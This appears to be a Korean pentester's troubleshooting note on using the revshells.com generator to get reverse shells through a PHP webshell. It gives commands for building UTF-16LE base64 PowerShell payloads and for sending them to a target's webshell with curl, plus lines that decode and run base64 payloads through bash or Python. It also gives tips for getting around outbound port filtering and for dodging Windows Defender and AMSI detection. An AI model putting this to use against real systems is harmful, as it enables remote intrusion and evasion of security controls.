# 페이로드 생성기 revshells.com 사용 노트

https://www.revshells.com/

페이로드를 그대로 복사해도 안 되는 경우가 잦다. 대부분은 생성기의 문제가 아니라 전달 경로(웹셸·셸·인코딩)에서 깨지는 것이다. 실제로 겪은 함정과 무반응일 때 점검 순서를 정리한다.

## 1. PowerShell Base64는 UTF-16LE

`powershell -e`(= `-EncodedCommand`)는 명령어 문자열을 UTF-16LE로 인코딩한 뒤 base64로 감싼 것만 받는다. 평문(UTF-8)을 그대로 base64 하면 파워셸이 디코딩에 실패한다.

```bash
# 직접 만들기
echo -n '<command>' | iconv -f utf-8 -t utf-16le | base64 -w0

# 검증 — 디코드 결과에 NUL(00) 바이트가 섞여 있으면 UTF-16LE 맞음
echo '<BASE64>' | base64 -d | xxd | head
```

revshells.com의 "PowerShell #3 (Base64)" 항목은 이 형식을 자동으로 맞춰 준다. 직접 만들 때가 오히려 틀리기 쉽다.

## 2. 무반응의 원인: php system()은 stdout만 반환

웹셸 파라미터로 명령을 실행하면 php `system()`은 stdout만 HTTP 응답으로 돌려준다. stderr는 웹 서버 에러 로그로 가므로 에러가 눈에 보이지 않고, 명령이 실패해도 빈 화면만 나온다.

```text
curl -G "http://TARGET/chunk.php" --data-urlencode "cmd=powershell -e <BASE64>"
        │
        ▼
php system("powershell -e <BASE64>")
        ├── stdout ──► HTTP 응답 (보인다)
        └── stderr ──► 웹 서버 에러 로그 (안 보인다)
```

디버깅할 때는 명령 끝에 `2>&1`을 붙여 stderr를 stdout으로 합쳐 응답으로 본다.

```bash
cmd=powershell -e <BASE64> 2>&1
```

## 3. nc 세션은 연결 직후 Enter

PowerShell 리버스 셸이 nc 리스너로 붙으면 프롬프트가 즉시 그려지지 않는다. Enter를 한 번 입력해야 실행 결과와 프롬프트가 나온다. "연결됐는데 죽었다"로 오해하지 말고 먼저 Enter부터 누른다.

## 4. 특수문자·이중 URL 인코딩

웹셸 파라미터·셸 중첩을 거치면 `$`, 백틱, 따옴표가 사라지거나 변수 확장으로 증발한다.

- curl로 넘길 때는 `-G` + `--data-urlencode`로 인코딩을 위임한다.
- 문법이 복잡한 페이로드는 base64로 감싸 디코딩해 실행한다.

```bash
echo '<BASE64>' | base64 -d | bash
python3 -c "import base64; exec(base64.b64decode('<BASE64>').decode())"
```

- Burp 등 프록시를 거치면 페이로드가 이중 URL 인코딩(`%20` → `%2520`)될 수 있다. 응답이 400이면 인코딩이 한 번 더 됐는지 확인한다.
- revshells.com의 URL Encode 옵션은 전달 경로에 맞게 켜고 끈다. IP·포트를 바꿨으면 복사한 문자열에 실제로 반영됐는지 눈으로 확인한다.

## 5. outbound 포트 차단

페이로드가 문법적으로 맞는데 리스너에 연결이 안 오면 아웃바운드 필터를 의심한다. 4444가 막히면 443, 80, 8080 순으로 바꾸고, TCP가 전부 막혔으면 ICMP·DNS 기반을 고려한다.

## 6. 백신·EDR 탐지

PowerShell Base64 실행은 Windows Defender·AMSI에 자주 걸린다. 무반응이면 위 1~5를 확인한 뒤 탐지 여부를 의심하고 다른 언어·인코딩으로 바꿔 본다.

## 무반응일 때 점검 순서

```text
리스너 떴는가 → Enter 쳤는가 → 인코딩 요건(UTF-16LE) 맞는가
→ 2>&1으로 에러 봤는가 → 특수문자·이중 인코딩 깨지지 않았는가
→ 포트 바꿔봤는가(443/80/8080) → 탐지 의심
```
